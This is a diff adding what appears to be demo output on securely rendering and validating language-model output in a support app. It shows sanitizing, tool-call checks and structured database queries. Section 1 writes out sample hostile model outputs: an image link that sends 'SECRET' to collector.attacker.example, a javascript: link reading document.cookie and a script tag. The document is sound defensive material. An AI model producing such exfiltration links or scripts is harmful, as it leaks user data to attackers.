@@ -1,0 +1,24 @@
+== 1. Rendering untrusted model output
+   model : See [refund policy](https://help.northwind.example/refunds).
+   unsafe: See <a href="https://help.northwind.example/refunds">refund policy</a>.
+   safe  : See <a href="https://help.northwind.example/refunds" rel="noopener noreferrer">refund policy</a>.
+   model : Done! ![img](https://collector.attacker.example/p.png?d=SECRET)
+   unsafe: Done! <img src="https://collector.attacker.example/p.png?d=SECRET" alt="img">
+   safe  : Done! [image removed: img]
+   model : [Reset password](javascript:alert(document.cookie))
+   unsafe: <a href="javascript:alert(document.cookie)">Reset password</a>
+   safe  : Reset password (link removed)
+   model : <script>steal()</script> Your order shipped.
+   unsafe: <script>steal()</script> Your order shipped.
+   safe  : &lt;script&gt;steal()&lt;/script&gt; Your order shipped.
+
+== 2. Validating proposed tool calls
+   ACCEPT: {"tool": "issue_refund", "arguments": {"order_id": "ORD-100001", "amount": 20}}
+   REJECT: {"tool": "issue_refund", "arguments": {"order_id": "ORD-100001", "amou -> amount out of allowed range
+   REJECT: {"tool": "delete_all_orders", "arguments": {}} -> unknown tool 'delete_all_orders'
+   REJECT: {"tool": "set_ticket_status", "arguments": {"ticket_id": 7, "status":  -> unexpected arguments ['notify']
+
+== 3. Database queries from model output
+   unsafe (model wrote SQL): [('ORD-100001', 'sam@example.org'), ('ORD-100002', 'lee@example.org'), ('ORD-100003', 'kim@example.org')]
+   safe (structured filter): [('ORD-100001', 'sam@example.org')]
+   safe rejects: filter on 'customer' with '=' is not allowed
